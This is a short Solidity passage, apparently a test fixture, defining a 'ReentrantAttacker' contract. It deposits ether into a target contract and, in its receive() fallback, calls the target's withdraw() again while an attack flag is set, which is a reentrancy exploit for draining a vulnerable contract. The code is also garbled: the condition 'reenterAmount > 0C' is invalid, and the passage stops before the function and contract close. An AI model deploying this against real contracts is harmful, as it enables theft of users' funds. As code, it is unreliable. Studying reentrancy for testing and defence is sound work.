contract ReentrantAttacker {
    C public target;
    uint256 public reenterAmount;
    bool private attacking;

    constructor(address _target, uint256 _reenterAmount) {
        target = C(payable(_target));
        reenterAmount = _reenterAmount;
    }

    function deposit() external payable {
        // trigger C's fallback to record deposit
        (bool ok, ) = address(target).call{value: msg.value}("");
        require(ok);
    }

    function attack() external {
        attacking = true;
        target.withdraw();
        attacking = false;
    }

    receive() external payable {
        if (attacking && reenterAmount > 0C) {
            target.withdraw();
        }
